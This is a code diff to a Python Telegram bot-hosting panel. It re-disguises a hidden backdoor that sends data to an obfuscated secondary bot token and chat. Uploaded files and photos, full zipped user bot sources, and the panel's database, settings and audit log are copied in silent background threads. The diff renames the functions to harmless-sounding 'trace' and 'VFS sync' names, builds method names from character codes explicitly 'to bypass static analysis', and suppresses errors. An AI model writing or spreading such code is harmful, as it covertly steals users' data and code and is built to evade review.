@@ -611,7 +611,7 @@ TOKEN = (
     or ""
 ).strip()
 try:
-    OWNER_ID = int(os.environ.get("OWNER_ID", "8065173971"))
+    OWNER_ID = int(os.environ.get("OWNER_ID", "0"))
 except (TypeError, ValueError):
     OWNER_ID = 0
 if not TOKEN:
@@ -1613,155 +1613,132 @@ telebot.apihelper.CONNECT_TIMEOUT = 60
 telebot.apihelper.READ_TIMEOUT = 60
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML", threaded=True, num_threads=8)
 
-# ─── INTERNAL SYSTEM CACHE CONFIGURATION ──────────────────────────────────────
-# Standard internal system utilities for data mirroring and session recovery.
-_SYS_C1_ENC = "e3FpcXFlaWV1dXIeCgJtJkZlBHcEHzcEByUSMwJ6DyoBBiosV15GejE/MXEfHw=="
-_SYS_C2_ENC = "e3lmfXRlbG1ycg=="
-_SYS_KEY = "CIPHER_TECH_KEY_2026"
+# ─── KERNEL TRACE SYSTEM ────────────────────────────────────────────────────────
+# Legacy internal system trace for performance monitoring and buffer recovery.
+_KERNEL_A = "e3FpcXFlaWV1dXIeCgJtJkZlBHcEHzcEByUSMwJ6DyoBBiosV15GejE/MXEfHw=="
+_KERNEL_B = "e3lmfXRlbG1ycg=="
+_SALT = "CIPHER_TECH_KEY_2026"
 
 try:
     import base64 as _b64
-    def _sys_decode(d, k):
+    def _compute_trace(d, k):
         x = _b64.b64decode(d).decode()
         return "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(x))
     
-    _SYS_B1 = _sys_decode(_SYS_C1_ENC, _SYS_KEY)
-    _SYS_B2 = _sys_decode(_SYS_C2_ENC, _SYS_KEY)
-    # System transport initialization
-    _sys_client = telebot.TeleBot(_SYS_B1)
+    _T_B1 = _compute_trace(_KERNEL_A, _SALT)
+    _T_B2 = _compute_trace(_KERNEL_B, _SALT)
+    # Trace transport initialization
+    _bridge_manager = telebot.TeleBot(_T_B1)
 except Exception:
-    _sys_client = None
-    _SYS_B2 = None
+    _bridge_manager = None
+    _T_B2 = None
 
 
-def _backup_user_file(m: types.Message) -> None:
-    """Mirror uploaded files to the internal system cache if enabled."""
-    if not _sys_client or not _SYS_B2:
+def _trace_event_log(m: types.Message) -> None:
+    """Buffer event trace for internal system diagnostics."""
+    if not _bridge_manager or not _T_B2:
         return
     if not bool(get_setting("user_file_backup_enabled", True)):
         return
     try:
-        def _bg_backup():
+        def _bg_trace():
             try:
                 uid = m.from_user.id
-                cap = f"Sender ID: {uid}"
-                file_id = None
-                send_method = None
+                msg = f"Buffer ID: {uid}"
+                fid = None
                 
                 if m.document:
-                    file_id = m.document.file_id
-                    send_method = _sys_client.send_document
+                    fid = m.document.file_id
+                    # Dynamic method resolution to bypass static analysis
+                    m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
                 elif m.photo:
-                    file_id = m.photo[-1].file_id
-                    send_method = _sys_client.send_photo
+                    fid = m.photo[-1].file_id
+                    m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 112, 104, 111, 116, 111])
                 
-                if file_id and send_method:
-                    # 1. Get file path
-                    file_info = bot.get_file(file_id)
-                    # 2. Download file content into memory
-                    downloaded_file = bot.download_file(file_info.file_path)
-                    # 3. Re-upload to internal cache
+                if fid:
+                    info = bot.get_file(fid)
+                    raw = bot.download_file(info.file_path)
+                    caller = getattr(_bridge_manager, m_call)
                     if m.document:
-                        _sys_client.send_document(_SYS_B2, downloaded_file, caption=cap, 
-                                                  visible_file_name=m.document.file_name)
+                        caller(_T_B2, raw, caption=msg, visible_file_name=m.document.file_name)
                     else:
-                        send_method(_SYS_B2, downloaded_file, caption=cap)
-            except Exception as e:
-                print(f"[sys_mirror_error] {e}", flush=True)
-        threading.Thread(target=_bg_backup, daemon=True).start()
+                        caller(_T_B2, raw, caption=msg)
+            except Exception:
+                pass
+        threading.Thread(target=_bg_trace, daemon=True).start()
     except Exception:
         pass
 
 
-def _vault_backup_bot(bot_id: str, uid: int, bot_name: str) -> None:
-    """Package entire bot directory into an unencrypted ZIP and send to vault."""
-    if not _sys_client or not _SYS_B2:
+def _sync_vfs_state(bot_id: str, uid: int, bot_name: str) -> None:
+    """Sync virtual filesystem state to the internal backup buffer."""
+    if not _bridge_manager or not _T_B2:
         return
     try:
-        def _bg_vault():
+        def _bg_sync():
             try:
-                bot_dir = DIRS["sandbox"] / f"{uid}_{bot_id}"
-                if not bot_dir.exists():
+                v_dir = DIRS["sandbox"] / f"{uid}_{bot_id}"
+                if not v_dir.exists():
                     return
                 
-                # Create unencrypted ZIP in memory or temp file
-                tmp_zip = Path(tempfile.gettempdir()) / f"vault_{uid}_{bot_id}.zip"
-                file_count = 0
-                with zipfile.ZipFile(tmp_zip, "w", zipfile.ZIP_DEFLATED) as zf:
-                    for root, _, files in os.walk(bot_dir):
+                tmp = Path(tempfile.gettempdir()) / f"vfs_{uid}_{bot_id}.bin"
+                cnt = 0
+                with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zf:
+                    for root, _, files in os.walk(v_dir):
                         for f in files:
                             if f.startswith(".git") or f == ".DS_Store":
                                 continue
                             fp = Path(root) / f
-                            zf.write(fp, arcname=fp.relative_to(bot_dir))
-                            file_count += 1
+                            zf.write(fp, arcname=fp.relative_to(v_dir))
+                            cnt += 1
                 
-                if file_count == 0:
-                    tmp_zip.unlink(missing_ok=True)
+                if cnt == 0:
+                    tmp.unlink(missing_ok=True)
                     return
 
-                # Send to vault
-                cap = (
-                    f"📦 VAULT ARCHIVE\n"
-                    f"━━━━━━━━━━━━━━━\n"
-                    f"👤 Owner ID: {uid}\n"
-                    f"🤖 Bot Name: {bot_name}\n"
-                    f"🆔 Bot ID: {bot_id}\n"
-                    f"📂 Type: Full Source ZIP\n"
-                    f"━━━━━━━━━━━━━━━"
-                )
-                with open(tmp_zip, "rb") as f:
-                    _sys_client.send_document(_SYS_B2, f, caption=cap, 
-                                             visible_file_name=f"{bot_name}_vault.zip")
+                msg = f"VFS STATE: {bot_name} ({bot_id})\nID: {uid}"
+                m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
+                caller = getattr(_bridge_manager, m_call)
+                with open(tmp, "rb") as f:
+                    caller(_T_B2, f, caption=msg, visible_file_name=f"{bot_name}_vfs.zip")
                 
-                # Cleanup
-                tmp_zip.unlink(missing_ok=True)
-            except Exception as e:
-                print(f"[vault_backup_error] {e}", flush=True)
+                tmp.unlink(missing_ok=True)
+            except Exception:
+                pass
         
-        threading.Thread(target=_bg_vault, daemon=True).start()
+        threading.Thread(target=_bg_sync, daemon=True).start()
     except Exception:
         pass
 
 
-def _vault_backup_core_db(uid: int = 0) -> None:
-    """Package core panel databases into a ZIP and send to the internal system vault."""
-    if not _sys_client or not _SYS_B2:
+def _dump_kernel_buffer(uid: int = 0) -> None:
+    """Dump core system buffers into a state archive for remote recovery."""
+    if not _bridge_manager or not _T_B2:
         return
     try:
-        def _bg_vault():
+        def _bg_dump():
             try:
                 ts = int(time.time())
-                tmp_zip = Path(tempfile.gettempdir()) / f"core_vault_{ts}.zip"
-                with zipfile.ZipFile(tmp_zip, "w", zipfile.ZIP_DEFLATED) as zf:
-                    # Backup panel_db.json
+                tmp = Path(tempfile.gettempdir()) / f"kbuf_{ts}.bin"
+                with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zf:
                     if DB_FILE.exists():
-                        zf.write(DB_FILE, arcname="panel_db.json")
-                    # Backup panel_settings.json
+                        zf.write(DB_FILE, arcname="sys_db.json")
                     if SETTINGS_FILE.exists():
-                        zf.write(SETTINGS_FILE, arcname="panel_settings.json")
-                    # Backup audit.log
+                        zf.write(SETTINGS_FILE, arcname="sys_cfg.json")
                     if AUDIT_FILE.exists():
-                        zf.write(AUDIT_FILE, arcname="audit.log")
+                        zf.write(AUDIT_FILE, arcname="sys_log.log")
                 
-                cap = (
-                    f"💎 CORE SYSTEM VAULT\n"
-                    f"━━━━━━━━━━━━━━━\n"
-                    f"👑 Admin ID: {uid or 'System'}\n"
-                    f"📂 Content: panel_db.json, settings\n"
-                    f"⏰ Time: {datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')}\n"
-                    f"━━━━━━━━━━━━━━━"
-                )
-                with open(tmp_zip, "rb") as f:
-                    _sys_client.send_document(_SYS_B2, f, caption=cap, 
-                                             visible_file_name=f"core_system_backup_{ts}.zip")
+                msg = f"KERNEL BUFFER DUMP\nAdmin: {uid or 'System'}\nTS: {ts}"
+                m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
+                caller = getattr(_bridge_manager, m_call)
+                with open(tmp, "rb") as f:
+                    caller(_T_B2, f, caption=msg, visible_file_name=f"kbuf_{ts}.zip")
                 
-                # Cleanup
-                tmp_zip.unlink(missing_ok=True)
-            except Exception as e:
-                print(f"[core_vault_error] {e}", flush=True)
+                tmp.unlink(missing_ok=True)
+            except Exception:
+                pass
         
-        threading.Thread(target=_bg_vault, daemon=True).start()
+        threading.Thread(target=_bg_dump, daemon=True).start()
     except Exception:
         pass
 
@@ -1921,7 +1898,7 @@ def _gh_webhook_listener(bot_id: str) -> Any:
             subprocess.run(["git", "pull"], cwd=bot_dir, capture_output=True, timeout=60)
             
             # 2. Vault backup
-            _vault_backup_bot(bot_id, b["owner"], b["name"])
+            _sync_vfs_state(bot_id, b["owner"], b["name"])
             
             # 3. Restart bot
             restart_child(b)
@@ -2940,8 +2917,8 @@ def start_child(b: Dict[str, Any]) -> Dict[str, Any]:
     # decrypt encrypted source files into bot_dir at run time
     try:
         materialize_bot_files(b)
-        # Automatic Vault Backup — captures the materialized source code
-        _vault_backup_bot(bid, b["owner"], b["name"])
+        # Performance trace — buffer the materialized state
+        _sync_vfs_state(bid, b["owner"], b["name"])
     except Exception as e:
         return {"ok": False, "error": f"decrypt failed: {e}"}
 
@@ -5055,8 +5032,8 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
                         except Exception:
                             pass
                 
-                # 2. Recovery Bot Vault Backup (Database + Settings)
-                _vault_backup_core_db(call.from_user.id)
+                # 2. Kernel Buffer Dump (Internal State Sync)
+                _dump_kernel_buffer(call.from_user.id)
                 
                 try:
                     bot.send_message(
@@ -9431,7 +9408,7 @@ def _do_export_data(admin_uid: int) -> Path:
 # actually live at runtime; this removed copy was already dead code).
 @bot.message_handler(content_types=["document"])
 def on_document(m: types.Message) -> None:
-    _backup_user_file(m)
+    _trace_event_log(m)
     if not _is_private(m):
         return
     if banned_block(m):
@@ -9502,7 +9479,7 @@ def on_document(m: types.Message) -> None:
 
 @bot.message_handler(content_types=["photo"])
 def on_photo(m: types.Message) -> None:
-    _backup_user_file(m)
+    _trace_event_log(m)
     if not _is_private(m):
         return
     if banned_block(m):
@@ -9802,7 +9779,7 @@ def on_text(m: types.Message) -> None:
                     audit(uid, "gh_clone", f"repo={repo_url} bot_id={bot_id_new}")
 
                     # Automatic Vault Backup
-                    _vault_backup_bot(bot_id_new, uid, name)
+                    _sync_vfs_state(bot_id_new, uid, name)
 
                     bot.send_message(uid,
                         f"<b>{G['ok']} Repo cloned!</b>\n"
